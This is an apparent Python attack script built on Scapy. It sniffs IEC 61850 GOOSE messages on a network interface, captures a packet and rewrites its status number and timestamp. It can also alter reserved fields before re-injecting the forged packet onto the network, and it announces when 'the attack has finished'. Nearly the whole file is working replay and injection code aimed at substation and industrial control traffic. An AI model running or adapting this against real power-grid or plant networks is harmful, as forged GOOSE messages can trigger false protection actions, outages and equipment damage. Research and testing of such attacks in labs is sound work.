import scapy.all as scapy
import logging
import time
import GAT_Main_20230712 as Main
from multiprocessing import Process, Pipe

def sniffed(packet): #Main method
    global dst_aux
    global src_aux
    global flag
    global save_packet
    global current_time
    global execution_time
    global start_time
    global data_values
    global option_selected
    global replay_time
    global check_stnum
    global replay_packet

    dict_tags = {}

    check_MAC = Main.filter_MAC(packet.dst,packet.src,dst_aux,src_aux) #Verify MAC of interest

    try:
        if (check_MAC==True):
            new_load = None
            previous_load, working_load = Main.separation_load(packet) #Separate packet load
            reserved = Main.check_reserved(previous_load) #Check if reserved field is modified
            if (reserved == False):
                dict_tags = Main.dict_separation(working_load) #Classificate tags of packet
                aux_status = tuple([i for i in dict_tags if i[1] == b'\x85'])
                aux_status = aux_status[0]
                previous_status = (int.from_bytes(dict_tags.get(
                    aux_status)[1:], byteorder="big")) #Get status number
                if(check_stnum==-1):
                    check_stnum = previous_status
                    if (start_time == 0):
                        start_time = time.time()
                    current_time = time.time()
                    print(f'Elapsed time = {current_time-start_time}') #Elapsed time until captured first packet
                elif(check_stnum+1 == previous_status or check_stnum==0): #Add in status number captured
                    if (save_packet == 1):
                        Main.packet_capture(packet,option_selected) #Save packet in pcap file
                    if (current_time == 0 or (current_time-start_time) < execution_time):
                        replay_packet = packet
                    if (replay_packet != None):
                        #Start preparation of multiprocessing
                        side_A, side_B = Pipe(duplex=True) #Define conection to multiprocessing
                        watcher = Process(target=Main.watcher_status, args=(data_values,side_B,)) #Define arguments of multiprocessing method 
                        watcher.start() #Start multiprocessing
                        at1 = time.time() #Set initial time multiprocessing
                        at2 = time.time() #Set counter time of multiprocessing
                        data = None
                        while(at2-at1<replay_time):  #Waited time
                            if (side_A.poll(0.1)):
                                data = side_A.recv()
                            at2 = time.time()
                        watcher.terminate() #Stop multiprocessing

                        previous_load, working_load = Main.separation_load(replay_packet) #Separate packet load
                        aux_number = (data[0])+1 #Add 1 to last status number
                        new_status = aux_number.to_bytes(
                                dict_tags.get(aux_status)[0], byteorder='big')
                        aux = int.to_bytes(dict_tags.get(aux_status)[0], 1, 'big')
                        dict_tags = Main.dict_separation(working_load) #Classificate tags of packet
                        dict_tags[aux_status] = aux+new_status #Set status number

                        aux_date = tuple([i for i in dict_tags if i[1]==b'\x84'])
                        aux_date = aux_date[0]
                        aux = int.to_bytes(dict_tags.get(aux_date)[0], 1, 'big')
                        dict_tags[aux_date] = aux+data[-1] #Set date

                        if (flag == 1):
                            previous_reserved = Main.flags_reserved(previous_load,option_selected) #Set reserved field
                            new_load = previous_reserved
                        elif (flag == 0):
                            new_load = previous_load

                        for j in dict_tags: #Encapsulate of the package
                            new_load += j[1]+dict_tags.get(j)

                        packet.load = new_load
                        scapy.sendp(packet, iface='eno1') #Send the modify packet to the network
                        raise KeyboardInterrupt
                    
                if ((current_time-start_time) >= execution_time):
                    print(f'The attack has finished\nGoodbye')
                    raise KeyboardInterrupt

    except Exception as e:
        # print(repr(e))
        if (str(e) == "int too big to convert"):
            logging.exception('Exception')
            print(
                f'Source = {packet.src} Destination = {packet.dst} \n {packet.show}')
            time.sleep(5)
            raise
        elif (str(e) != 'type'):
            logging.exception('Exception')
            print(repr(e))
            raise
        else:
            pass


def start(values,option): #Set initial values
    global dst_aux
    dst_aux = values[0]
    global src_aux
    src_aux = values[1]
    global flag
    flag = values[2]
    global save_packet
    save_packet = values[3]
    global execution_time
    execution_time = values[4]
    global replay_time
    replay_time = values[5]
    global option_selected
    option_selected = option

    global data_values
    data_values = values

    global current_time
    global start_time
    
    global check_stnum

    check_stnum = -1

    start_time = 0
    current_time = 0

    global replay_packet
    replay_packet = None

    scapy.sniff(iface='eno1', store = 0, lfilter=Main.filter_GOOSE, prn=sniffed, timeout = execution_time+60) #Start Scapy capture
